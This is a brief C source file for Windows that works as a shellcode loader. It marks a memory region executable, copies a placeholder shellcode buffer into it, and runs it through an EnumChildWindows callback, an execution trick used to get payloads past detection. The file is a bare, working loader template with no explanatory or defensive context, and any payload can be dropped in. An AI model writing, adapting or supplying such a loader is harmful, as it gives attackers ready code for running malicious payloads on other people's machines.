#include <windows.h>

unsigned char shellcode[] =
"[Shellcode]";

int main(int argc, char* argv[]) {
  LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, shellcode, sizeof(shellcode));
  EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
  return 0;
}
